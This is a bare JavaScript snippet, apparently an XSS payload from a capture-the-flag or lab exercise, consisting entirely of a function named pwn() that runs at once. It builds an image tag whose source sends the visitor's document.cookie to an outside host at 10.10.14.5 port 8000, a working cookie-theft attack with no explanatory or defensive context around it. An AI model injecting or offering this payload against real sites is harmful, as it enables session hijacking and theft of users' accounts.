function pwn() {
    var img = document.createElement("img");
    img.src = "http://10.10.14.5:8000//grab" + document.cookie;
    document.body.appendChild(img);
}
pwn();
